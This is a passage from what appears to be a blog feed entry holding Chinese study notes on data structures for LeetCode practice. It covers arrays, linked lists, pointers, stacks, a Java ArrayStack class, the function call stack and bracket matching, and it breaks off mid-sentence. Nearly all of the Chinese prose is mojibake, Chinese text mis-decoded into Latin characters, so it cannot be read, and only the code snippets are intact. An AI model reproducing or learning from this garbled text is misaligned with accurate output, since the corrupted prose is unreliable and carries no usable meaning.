      <link href="/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-æ•°ç»„"><a href="#1-æ•°ç»„" class="headerlink" title="1. æ•°ç»„"></a>1. æ•°ç»„</h3><p>æ•°ç»„(Array)æ˜¯ä¸€ç§çº¿æ€§è¡¨æ•°æ®ç»“æ„ã€‚å®ƒç”¨ä¸€ç»„è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œæ¥å­˜å‚¨ä¸€ç»„ç›¸åŒç±»å‹çš„æ•°æ®ã€‚</p><ul><li><p>çº¿æ€§è¡¨<br>çº¿æ€§è¡¨å°±æ˜¯æ•°æ®æ’æˆåƒä¸€æ¡çº¿ä¸€æ ·çš„ç»“æ„ã€‚æ¯ä¸ªçº¿æ€§è¡¨ä¸Šçš„æ•°æ®æœ€å¤šåªæœ‰å‰å’Œåä¸¤ä¸ªæ–¹å‘ã€‚é™¤äº†æ•°ç»„ï¼Œé“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆç­‰éƒ½æ˜¯çº¿æ€§è¡¨ç»“æ„ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/1.jpg" style="max-width: 500px; margin-top: 20px"></p></li><li><p><em>éšæœºè®¿é—®</em><br>è¿ç»­çš„å†…å­˜ç©ºé—´å’Œç›¸åŒç±»å‹çš„æ•°æ®ã€‚å› ä¸ºæœ‰äº†è¿™ä¸ªé™åˆ¶ï¼Œå®ƒæ‰æœ‰äº†ä¸€ä¸ªå ªç§°â€œæ€æ‰‹é”â€çš„ç‰¹æ€§ï¼š<strong>éšæœºè®¿é—®</strong>ã€‚ä¹Ÿå› ä¸ºè¿™ä¸¤ä¸ªé™åˆ¶ï¼Œè®©æ•°ç»„çš„å¾ˆå¤šæ“ä½œå˜å¾—éå¸¸ä½æ•ˆï¼Œæ¯”å¦‚åˆ é™¤ã€æ’å…¥ä¸€ä¸ªæ•°æ®ï¼Œä¸ºäº†ä¿è¯è¿ç»­æ€§ï¼Œå°±éœ€è¦åšå¤§é‡çš„æ•°æ®æ¬ç§»å·¥ä½œã€‚</p></li><li><p>æ•°ç»„å¦‚ä½•é€šè¿‡ä¸‹æ ‡éšæœºè®¿é—®?<br>é€šè¿‡å¯»å€å…±è¯†ï¼Œè®¡ç®—å‡ºå­˜å‚¨å…ƒç´ çš„å†…å­˜åœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a[i]_address = base_address + i * data_type_size</span><br><span class="line"></span><br><span class="line">// äºŒä½æ•°ç»„å†…å­˜å¯»å€</span><br><span class="line">å¯¹äºm * nçš„æ•°ç»„, a[i][j]( i &lt; m, j &lt; n)çš„åœ°å€ä¸º</span><br><span class="line">a[i][j]_address = base_address + ( i * n + j ) * data_type_size</span><br></pre></td></tr></table></figure></li><li><p><em>ä½æ•ˆçš„â€œæ’å…¥â€å’Œâ€œåˆ é™¤â€</em><br><strong>ä¸ºäº†ä¿æŒå†…å­˜æ•°ç»„çš„è¿ç»­æ€§</strong>ï¼Œå°†ä¸€ä¸ªæ•°æ®æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬kä¸ªä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦å°†ç¬¬k~nè¿™éƒ¨åˆ†çš„å…ƒç´ éƒ½é¡ºåºå¾€åæŒªä»¥ä¸ºã€‚å¹³å‡æƒ…å†µæ—¶é—´å¤æ‚åº¦ä¸º(1+2+..+n)/n = O(n).</p></li><li><p>æ”¹è¿›æ–¹æ³•ï¼ˆèˆå¼ƒæ•°ç»„çš„è¿ç»­æ€§ï¼‰<br><em>å¿«æ’</em>:  ç›´æ¥å°†ç¬¬kä½çš„æ•°æ®æ¬ç§»åˆ°æ•°ç»„å…ƒç´ çš„æœ€åï¼ŒæŠŠæ–°çš„å…ƒç´ ç›´æ¥æ”¾å…¥ç¬¬kä¸ªä½ç½®ã€‚æ—¶é—´å¤æ‚åº¦é™ä¸ºO(1)<br><em>JVMæ ‡è®°æ¸…é™¤åƒåœ¾</em>:  åˆ é™¤æ“ä½œï¼Œåªæ˜¯è®°å½•æ•°æ®å·²ç»è¢«åˆ é™¤ã€‚å½“æ•°ç»„æ²¡æœ‰æ›´å¤šç©ºé—´å­˜å‚¨æ•°æ®æ—¶ï¼Œæ‰è§¦å‘æ‰§è¡Œä¸€æ¬¡çœŸæ­£çš„åˆ é™¤æ“ä½œã€‚å¤§å¤§å‡å°‘äº†æ•°æ®æ¬ç§»çš„æ¬¡æ•°ã€‚</p></li><li><p>æ•°ç»„çš„è®¿é—®è¶Šç•Œé—®é¢˜</p></li><li>ä¸ºä»€ä¹ˆæ•°ç»„è¦ä»0å¼€å§‹ç¼–å·?<br>å¦‚æœä»1å¼€å§‹ç¼–å·ï¼Œæ¯æ¬¡éšæœºè®¿é—®æ•°ç»„å…ƒç´ éƒ½å¤šäº†ä¸€æ¬¡å‡æ³•è¿ç®—ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ä»0å¼€å§‹</span><br><span class="line">a[k]_address = base_address + k * type_size</span><br><span class="line"></span><br><span class="line">// ä»1å¼€å§‹</span><br><span class="line">a[k]_address = base_address + ( k - 1 ) * type_size</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-é“¾è¡¨"><a href="#2-é“¾è¡¨" class="headerlink" title="2. é“¾è¡¨"></a>2. é“¾è¡¨</h3><p>æ•°ç»„éœ€è¦ä¸€å—è¿ç»­çš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨ï¼Œè€Œé“¾è¡¨æ°æ°ç›¸åï¼Œå®ƒå¹¶ä¸éœ€è¦ä¸€å—è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œå®ƒé€šè¿‡â€œæŒ‡é’ˆâ€å°†ä¸€ç»„<strong>é›¶æ•£çš„å†…å­˜å—</strong>ä¸²è”èµ·æ¥ä½¿ç”¨ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/2.jpg" style="max-width: 500px; margin-top: 20px"></p><p><br></p><h4 id="2-1-å•é“¾è¡¨"><a href="#2-1-å•é“¾è¡¨" class="headerlink" title="2.1 å•é“¾è¡¨"></a>2.1 å•é“¾è¡¨</h4><p>ä¸ºäº†å°†æ‰€æœ‰èŠ‚ç‚¹ä¸²èµ·æ¥ï¼Œæ¯ä¸ªé“¾è¡¨çš„èŠ‚ç‚¹é™¤äº†å­˜å‚¨æ•°æ®ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®°å½•é“¾ä¸Šçš„ä¸‹ä¸€ä¸ªç»“ç‚¹çš„åœ°å€ã€‚æˆ‘ä»¬æŠŠè¿™ä¸ªè®°å½•ä¸‹ä¸ªèŠ‚ç‚¹åœ°å€çš„æŒ‡é’ˆå«ä½œ<strong>åç»­æŒ‡é’ˆ next</strong>ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/3.jpg" style="max-width: 500px; margin: 20px auto"></p><p>ä¸æ•°ç»„ä¸€æ ·ï¼Œé“¾è¡¨ä¹Ÿæ”¯æŒæ•°æ®çš„æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤ã€‚åœ¨é“¾è¡¨ä¸­æ’å…¥æˆ–è€…åˆ é™¤ä¸€ä¸ªæ•°æ®ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦ä¸ºäº†ä¿æŒå†…å­˜çš„è¿ç»­æ€§è€Œæ¬ç§»ç»“ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦è€ƒè™‘ç›¸é‚»ç»“ç‚¹çš„æŒ‡é’ˆæ”¹å˜ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯O(1)ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/4.jpg" style="max-width: 500px; margin: 20px auto"></p><p>ä½†æ˜¯ï¼Œé“¾è¡¨æƒ³è¦éšæœºè®¿é—®ç¬¬kä¸ªå…ƒç´ ï¼Œå°±æ— æ³•åƒæ•°ç»„é‚£æ ·ï¼Œé€šè¿‡å¯»å€å…¬å¼ç›´æ¥è®¡ç®—å‡ºå¯¹åº”çš„å†…å­˜åœ°å€ã€‚è€Œæ˜¯éœ€è¦æ ¹æ®æŒ‡é’ˆä¸€ä¸ªç»“ç‚¹ä¸€ä¸ªç»“ç‚¹åœ°ä¾æ¬¡éå†ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸åº”çš„ç»“ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚</p><p><br></p><ul><li><strong>å¾ªç¯é“¾è¡¨</strong><br>å•é“¾è¡¨çš„å°¾ç»“ç‚¹æŒ‡é’ˆæŒ‡å‘ç©ºåœ°å€ï¼Œæ¥è¡¨ç¤ºè¿™æ˜¯æœ€åçš„ç»“ç‚¹ã€‚è€Œå¾ªç¯é“¾è¡¨çš„å°¾ç»“ç‚¹æŒ‡å‘é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚</li></ul><p><br></p><h4 id="2-2-åŒå‘é“¾è¡¨"><a href="#2-2-åŒå‘é“¾è¡¨" class="headerlink" title="2.2 åŒå‘é“¾è¡¨"></a>2.2 åŒå‘é“¾è¡¨</h4><p>æ¯ä¸ªç»“ç‚¹ä¸æ­¢æœ‰ä¸€ä¸ªåç»­æŒ‡é’ˆ<code>next</code>æŒ‡å‘åé¢çš„ç»“ç‚¹ï¼Œè¿˜æœ‰ä¸€ä¸ªå‰é©±æŒ‡é’ˆ<code>prev</code>æŒ‡å‘ç­¾åçš„èŠ‚ç‚¹ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/5.jpg" style="max-width: 500px; margin: 20px auto"></p><ul><li><strong>ç›¸æ¯”å•é“¾è¡¨ï¼ŒåŒå‘é“¾è¡¨é€‚åˆè§£å†³å“ªç§é—®é¢˜ï¼Ÿ</strong><br>åœ¨å®é™…çš„å¼€å‘ä¸­ï¼Œä»é“¾è¡¨ä¸­åˆ é™¤ä¸€ä¸ªæ•°æ®æ— å¤–ä¹è¿™ä¸¤ç§æƒ…å†µï¼š<br><em>- åˆ é™¤ç»“ç‚¹ä¸­â€œå€¼ç­‰äºæŸä¸ªç»™å®šå€¼â€çš„ç»“ç‚¹</em><br>æ­¤æ—¶ï¼Œæ— è®ºæ˜¯å•é“¾è¡¨è¿˜æ˜¯åŒé“¾è¡¨ï¼Œéƒ½éœ€è¦ä»å¤´ç»“ç‚¹ä¸€ä¸ªä¸ªéå†å¯¹æ¯”ï¼ŒçŸ¥é“é­åˆ°ç»™å®šå€¼çš„ç»“ç‚¹ã€‚æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚<br><em>- åˆ é™¤ç»™å®šæŒ‡é’ˆæŒ‡å‘çš„ç»“ç‚¹</em><br>åˆ é™¤æŸä¸ªç»“ç‚¹éœ€è¦çŸ¥é“å…¶å‰é©±ç»“ç‚¹ï¼Œè€Œå•é“¾è¡¨ä¸èƒ½ç›´æ¥è·å–ã€‚ä¸ºäº†æ‰¾åˆ°å‰é©±ç»“ç‚¹ï¼Œæˆ‘ä»¬è¿˜è¦ä»å¤´ç»“ç‚¹å¼€å§‹éå†é“¾è¡¨ï¼ŒçŸ¥é“p-&gt;next = qã€‚æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œè€ŒåŒå‘é“¾è¡¨åªéœ€O(1)ã€‚</li></ul><p><br></p><ul><li><strong>æœ‰åºé“¾è¡¨</strong><br>å¯¹äºæœ‰åºé“¾è¡¨ï¼ŒåŒå‘é“¾è¡¨çš„æŒ‰å€¼æŸ¥è¯¢çš„æ•ˆç‡æ›´é«˜ã€‚æˆ‘ä»¬å¯ä»¥è®°å½•ä¸Šæ¬¡æŸ¥æ‰¾çš„ä½ç½®pï¼Œæ¯æ¬¡æŸ¥è¯¢æ—¶ï¼Œæ ¹æ®è¦æŸ¥æ‰¾çš„å€¼ä¸pçš„å¤§å°å…³ç³»ï¼Œå†³å®šå¾€å‰è¿˜æ˜¯å¾€åæŸ¥æ‰¾ï¼Œå¹³å‡åªéœ€è¦æŸ¥æ‰¾ä¸€åŠçš„æ•°æ®ã€‚ Java LinkedHashMap</li></ul><p><br></p><ul><li><strong>å®ç°LRUç¼“å­˜æ·˜æ±°ç®—æ³•</strong><blockquote><p>ç¼“å­˜æ˜¯ä¸€ç§æé«˜æ•°æ®è¯»å–æ€§èƒ½çš„æŠ€æœ¯ï¼Œå¸¸è§çš„æœ‰CPUç¼“å­˜ã€æ•°æ®åº“ç¼“å­˜ã€æµè§ˆå™¨ç¼“å­˜ç­‰ã€‚ç¼“å­˜çš„å¤§å°æœ‰é™ï¼Œå½“ç¼“å­˜è¢«ç”¨æ»¡æ—¶ï¼Œå“ªäº›æ•°æ®åº”è¯¥è¢«æ¸…ç†ï¼Œå“ªäº›æ•°æ®åº”è¯¥è¢«ä¿ç•™ã€‚è¿™å°±éœ€è¦ç¼“å­˜æ·˜æ±°ç­–ç•¥æ¥å†³å®šã€‚å¸¸è§çš„ç­–ç•¥æœ‰ä¸‰ç§: å…ˆè¿›å…ˆå‡ºç­–ç•¥(FIFO - first in, first out), æœ€å°‘ä½¿ç”¨ç­–ç•¥(LFU - least frequently used), æœ€è¿‘æœ€å°‘ä½¿ç”¨ç­–ç•¥(LRU - least recently used)ã€‚</p></blockquote></li></ul><p><em>å®ç°æ€è·¯: è¶Šé è¿‘å°¾éƒ¨çš„ç»“ç‚¹æ˜¯è¶Šæ—©å‰è®¿é—®çš„ã€‚</em></p><ol><li>ç»´æŠ¤ä¸€ä¸ªæœ‰åºå•é“¾è¡¨</li><li>å½“è¦è®¿é—®ä¸€ä¸ªæ•°æ®æ—¶ï¼Œæˆ‘ä»¬ä»é“¾è¡¨å¤´å¼€å§‹éå†é“¾è¡¨ã€‚<br>å¦‚æœæ•°æ®å·²ç»å­˜åœ¨äºé“¾è¡¨ä¸­ï¼Œå°†å…¶ä»åŸæ¥çš„æ–‡èŒåˆ é™¤ï¼Œå†æ’å…¥åˆ°é“¾è¡¨çš„å¤´éƒ¨ã€‚<br>å¦‚æœæ•°æ®ä¸å­˜åœ¨äºé“¾è¡¨ä¸­ï¼Œæ­¤æ—¶ç¼“å­˜æœªæ»¡ï¼Œå°†æ­¤ç»“ç‚¹ç›´æ¥æ’å…¥åˆ°é“¾è¡¨çš„å¤´éƒ¨ã€‚<br>å¦‚æœæ•°æ®ä¸å­˜åœ¨ä¸é“¾è¡¨ä¸­ï¼Œæ­¤æ—¶ç¼“å­˜å·²æ»¡ï¼Œåˆ™åˆ é™¤é“¾è¡¨å°¾ç»“ç‚¹ï¼Œå°†æ–°æ•°æ®æ’å…¥é“¾è¡¨çš„å¤´éƒ¨ã€‚</li></ol><p><br></p><ul><li><strong>åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦æ˜¯å›æ–‡å­—ç¬¦ä¸²</strong><br>ä½¿ç”¨å¿«æ…¢ä¸¤ä¸ªæŒ‡é’ˆæ‰¾åˆ°é“¾è¡¨ä¸­ç‚¹ï¼Œæ…¢æŒ‡é’ˆæ¯æ¬¡å‰è¿›1æ­¥ï¼Œå¿«æŒ‡é’ˆæ¯æ¬¡å‰è¿›2æ­¥ã€‚åœ¨æ…¢æŒ‡é’ˆå‰è¿›çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹å…¶nextæŒ‡é’ˆï¼Œä½¿å¾—é“¾è¡¨å‰åŠéƒ¨åˆ†ååºã€‚æœ€åæ¯”è¾ƒä¸­ç‚¹ä¸¤ä¾§çš„é“¾è¡¨æ˜¯å¦ç›¸ç­‰ã€‚</li></ul><p><br></p><h4 id="2-3-æŒ‡é’ˆçš„å«ä¹‰"><a href="#2-3-æŒ‡é’ˆçš„å«ä¹‰" class="headerlink" title="2.3 æŒ‡é’ˆçš„å«ä¹‰"></a>2.3 æŒ‡é’ˆçš„å«ä¹‰</h4><p>æœ‰çš„è¯­è¨€æœ‰â€œæŒ‡é’ˆâ€çš„æ¦‚å¿µï¼Œæœ‰çš„æ²¡æœ‰ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯â€œå¼•ç”¨â€ã€‚æ— è®ºæ˜¯â€œæŒ‡é’ˆâ€è¿˜æ˜¯â€œå¼•ç”¨â€ï¼ŒæŒ‡çš„éƒ½æ˜¯å­˜å‚¨æ‰€æŒ‡å¯¹è±¡çš„å†…å­˜ä½ç½®ã€‚</p><p><em>å°†æŸä¸ªå˜é‡èµ‹å€¼ç»™æŒ‡é’ˆï¼Œå®é™…ä¸Šå°±æ˜¯å°†è¿™ä¸ªå˜é‡çš„åœ°å€èµ‹å€¼ç»™æŒ‡é’ˆï¼Œæˆ–è€…åè¿‡æ¥è¯´ï¼ŒæŒ‡é’ˆä¸­å­˜å‚¨äº†è¿™ä¸ªå˜é‡çš„å†…å­˜åœ°å€ï¼ŒæŒ‡å‘äº†è¿™ä¸ªå˜é‡ï¼Œé€šè¿‡æŒ‡é’ˆå°±èƒ½æ‰¾åˆ°è¿™ä¸ªå˜é‡ã€‚</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// pç»“ç‚¹çš„nextæŒ‡é’ˆå­˜å‚¨äº†qç»“ç‚¹çš„å†…å­˜åœ°å€</span><br><span class="line">p-&gt;next=q</span><br><span class="line"></span><br><span class="line">// pç»“ç‚¹çš„nextæŒ‡é’ˆå­˜å‚¨äº†pç»“ç‚¹çš„ä¸‹ä¸‹ä¸€ä¸ªç»“ç‚¹çš„å†…å­˜åœ°å€</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br></pre></td></tr></table></figure><ul><li><p>å•é“¾è¡¨çš„æ’å…¥åˆ é™¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// æ’å…¥ä¸€ä¸ªæ–°ç»“ç‚¹</span><br><span class="line">new_node-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = new_node;</span><br><span class="line"></span><br><span class="line">// å‘ä¸€ä¸ªç©ºé“¾è¡¨æ’å…¥ç¬¬ä¸€ä¸ªç»“ç‚¹</span><br><span class="line">if( head == null )&#123;</span><br><span class="line">  head = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// åˆ é™¤ç»“ç‚¹</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br><span class="line"></span><br><span class="line">// åˆ é™¤æœ€åä¸€ä¸ªç»“ç‚¹</span><br><span class="line">if( head-&gt;next == null )&#123;</span><br><span class="line">  head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å“¨å…µç»“ç‚¹<br>å“¨å…µç»“ç‚¹æ˜¯ä¸å­˜å‚¨æ•°æ®çš„ã€‚</p></li></ul><p><br></p><h3 id="3-æ ˆ"><a href="#3-æ ˆ" class="headerlink" title="3. æ ˆ"></a>3. æ ˆ</h3><p>åè¿›è€…å…ˆå‡ºï¼Œå…ˆè¿›è€…åå‡ºï¼Œè¿™å°±æ˜¯å…¸å‹çš„â€œæ ˆâ€ç»“æ„ã€‚ä»æ“ä½œç‰¹æ€§æ¥çœ‹ï¼Œæ ˆæ˜¯ä¸€ç§â€œæ“ä½œå—é™â€çš„çº¿æ€§è¡¨ï¼Œåªå…è®¸åœ¨ä¸€ç«¯æ’å…¥å’Œåˆ é™¤æ•°æ®ã€‚</p><ul><li>ç”¨æ•°ç»„å®ç°æ ˆ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String[] items; <span class="comment">// æ•°ç»„</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count;      <span class="comment">// æ ˆä¸­å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n;          <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–æ•°ç»„ï¼Œç”³è¯·ä¸€ä¸ªå¤§å°ä¸ºnçš„æ•°ç»„ç©ºé—´</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.items = <span class="keyword">new</span> String[n];</span><br><span class="line">    <span class="keyword">this</span>.n = n;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å…¥æ ˆæ“ä½œ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">push</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == n) <span class="keyword">return</span> <span class="keyword">false</span>;  <span class="comment">// æ•°ç»„ç©ºé—´ä¸å¤Ÿäº†ï¼Œå…¥æ ˆå¤±è´¥ï¼Œè¿”å›false</span></span><br><span class="line">    items[count] = item;</span><br><span class="line">    ++count;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‡ºæ ˆæ“ä½œ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// è¿”å›ä¸‹æ ‡ä¸ºcount - 1 çš„æ•°ç»„å…ƒç´ ï¼Œå¹¶ä¸”æ ˆä¸­å…ƒç´ ä¸ªæ•°count-1</span></span><br><span class="line">    String tmp = items[count - <span class="number">1</span>];</span><br><span class="line">    --count;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><ul><li>å‡½æ•°è°ƒç”¨æ ˆ</li></ul><p>æˆ‘ä»¬çŸ¥é“ï¼Œæ“ä½œç³»ç»Ÿç»™æ¯ä¸ªçº¿ç¨‹åˆ†é…äº†ä¸€å—ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œè¿™å—å†…å­˜è¢«ç»„ç»‡æˆâ€œæ ˆâ€ï¼Œç”¨æ¥å‚¨å­˜å‡½æ•°è°ƒç”¨æ—¶çš„ä¸´æ—¶å˜é‡ã€‚æ¯è¿›å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šå°†ä¸´æ—¶å˜é‡ä½œä¸ºä¸€ä¸ªæ ˆå¸§å…¥æ ˆï¼Œå½“è¢«è°ƒç”¨å‡½æ•°æ‰§è¡Œå®Œæˆï¼Œè¿”å›ä¹‹åï¼Œå°†è¿™ä¸ªå‡½æ•°å¯¹åº”çš„æ ˆå¸§å‡ºæ ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">  ret = add(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">  res = a + ret;</span><br><span class="line">  printf(<span class="string">"%d"</span>, res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = x + y;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/6.jpg" style="max-width: 400px"></p><p><br></p><ul><li>è¡¨è¾¾å¼æ±‚å€¼<code>3+5/*8-6</code></li></ul><p>ç¼–è¯‘å™¨é€šè¿‡ä¸¤ä¸ªæ ˆå®ç°ã€‚å…¶ä¸­ä¸€ä¸ªä¿å­˜æ“ä½œæ•°çš„æ ˆï¼Œå¦ä¸€ä¸ªä¿å­˜è¿ç®—ç¬¦çš„æ ˆã€‚æˆ‘ä»¬ä»å·¦å‘å³éå†è¡¨è¾¾å¼ï¼Œå½“é‡åˆ°æ•°å­—ï¼Œå‹å…¥æ“ä½œæ•°æ ˆï¼›å½“é‡åˆ°è¿ç®—ç¬¦ï¼Œå°±ä¸è¿ç®—ç¬¦æ ˆçš„æ ˆé¡¶å…ƒç´ è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ¯”è¿ç®—ç¬¦æ ˆé¡¶å…ƒç´ çš„ä¼˜å…ˆçº§é«˜ï¼Œå°±å‹å…¥æ ˆã€‚å¦‚æœæ¯”æ ˆé¡¶å…ƒç´ ä¼˜å…ˆçº§ä½æˆ–è€…ç›¸åŒï¼Œä»è¿ç®—ç¬¦æ ˆä¸­å–æ ˆé¡¶è¿ç®—ç¬¦ï¼Œä»æ“ä½œæ•°æ ˆçš„æ ˆé¡¶å–2ä¸ªæ“ä½œæ•°ï¼Œè¿›è¡Œè®¡ç®—ï¼Œå†æŠŠè®¡ç®—å®Œçš„ç»“æœå‹å…¥æ“ä½œæ•°æ ˆã€‚ç»§ç»­æ¯”è¾ƒã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/7.jpg" style="max-width: 700px"></p><ul><li>æ£€æŸ¥è¡¨è¾¾å¼ä¸­çš„æ‹¬å·æ˜¯å¦åŒ¹é…</li></ul><p>è¡¨è¾¾å¼ä¸­åŒ…æ‹¬ä¸‰ç§æ‹¬å·<code>() {} []</code>ï¼Œ<code>{[{}]}, [{()}([])]</code>ç­‰éƒ½ä¸ºåˆæ³•æ ¼å¼ï¼Œè€Œ<code>{[}()], [({)]</code>ä¸ºä¸åˆæ³•åˆé€‚ã€‚å¦‚ä½•æ£€æŸ¥å®ƒæ˜¯å¦åˆæ³•ï¼Ÿ</p><p>ä»å·¦åˆ°å³æ‰«æå­—ç¬¦ä¸²ï¼Œå½“æ‰«æåˆ°å·¦æ‹¬å·æ—¶ï¼Œå°†å…¶å‹å…¥æ ˆä¸­ï¼›å½“æ‰«æåˆ°æœ‰å³æ‹¬å·æ—¶ï¼Œä»æ ˆé¡¶å–å‡ºä¸€ä¸ªå·¦æ‹¬å·ã€‚å¦‚æœèƒ½å¤ŸåŒ¹é…ï¼Œåˆ™ç»§ç»­æ‰«æå‰©ä¸‹çš„å­—ç¬¦ä¸²ã€‚å¦‚æœä¸èƒ½åŒ¹é…ï¼Œæˆ–æ ˆä¸­æ²¡æœ‰æ•°æ®ï¼Œåˆ™è¯´æ˜ä¸ºéæ³•æ ¼å¼ã€‚</p><p><br></p><ul><li><strong>å®ç°æµè§ˆå™¨å‰è¿›åé€€åŠŸèƒ½</strong></li></ul><p>å½“ä½ 